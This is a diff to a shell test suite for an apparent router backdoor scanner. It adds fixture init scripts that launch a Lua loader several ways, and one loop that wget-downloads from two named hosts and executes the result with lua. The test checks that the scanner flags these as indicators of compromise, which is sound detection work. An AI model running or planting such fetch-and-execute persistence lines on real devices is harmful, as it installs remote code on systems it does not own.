@@ -383,6 +383,22 @@ expect "no backdoor-init, a clean verdict (exit 0)" '[ $rc = 0 ] && ! grep -q "b
 expect "a block written by echo is INFO, a list for a loop REVIEW" 'grep -q "INFO  *backdoor-block  */etc/init.d/bd-block" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/bd-loop" "$D/check.txt"'
 umount "$D/m"
 
+echo "=== other ways to start the loader, and a loop that fetches from the servers (review of 2.54)"
+D=$(mkscen bdvar "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '#!/bin/sh /etc/rc.common\nUSE_PROCD=1\nstart_service() {\n\tprocd_open_instance\n\tprocd_set_param command /usr/bin/lua /bin/ulogd\n\tprocd_close_instance\n}\n' >"$U/etc/init.d/bv-procd"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\tsetsid lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-setsid"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\t{ lua /bin/ulogd; } &\n}\n' >"$U/etc/init.d/bv-group"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\tenv lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-env"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\tcommand -v monitord >/dev/null && killall monitord\n}\n' >"$U/etc/init.d/bv-own"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\tfor h in cdn.adguardns.com cdn.adxinsight.com; do wget -qO /tmp/u "http://$h/u" && lua /tmp/u; done\n}\n' >"$U/etc/init.d/bv-fetch"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "procd, setsid, { } and env starting the loader are each IOC backdoor-init" '[ $rc = 1 ] && ( for n in procd setsid group env; do grep -q "IOC  *backdoor-init  */etc/init.d/bv-$n" "$D/check.txt" || exit 1; done )'
+expect "command -v monitord starts nothing" '! grep -q "backdoor-init  */etc/init.d/bv-own" "$D/check.txt"'
+expect "a loop that fetches from the servers is IOC backdoor-host, not REVIEW" 'grep -q "IOC  *backdoor-host  */etc/init.d/bv-fetch" "$D/check.txt" && ! grep -q "REVIEW  *server-ref  */etc/init.d/bv-fetch" "$D/check.txt"'
+umount "$D/m"
+
 echo "=== gl-helper under another name, known by its packer (topic 73056, post 94)"
 D=$(mkscen npk "$OWL"); U=$D/u
 mkdir -p "$U/usr/sbin" "$U/root" "$U/etc/svc"
